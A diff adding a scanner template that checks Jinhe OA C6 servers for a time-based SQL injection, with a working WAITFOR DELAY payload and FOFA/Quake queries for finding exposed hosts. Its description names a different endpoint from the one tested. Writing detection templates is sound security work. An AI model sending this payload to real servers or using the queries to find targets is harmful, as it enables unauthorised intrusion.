@@ -1,0 +1,32 @@
+id: jinhe-C6-GeneralXmlhttpPage-time-sqli
+
+info:
+  name: 金和OA C6-GeneralXmlhttpPage.aspx SQL注入
+  author: g3m
+  severity: high
+  metadata: 
+    fofa-query: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
+    quake-query: body="金和网络 @2023"
+  description: 金和OA协同办公管理系统C6软件共有20多个应用模块，160多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围，从功能型的协同办公平台上升到管理型协同管理平台，并不断的更新完善，全面支撑企业发展,提供专业oa,oa系统,oa办公系统,办公自动化软件,协同办公管理系统.支持oa办公自动化系统免费在线试用。金和OA GetTreeDate存在SQL注入漏洞。
+
+http:
+  - raw:
+    - |
+      @timeout
+      GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+      Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+      
+      - type: status
+        status:
+          - 200
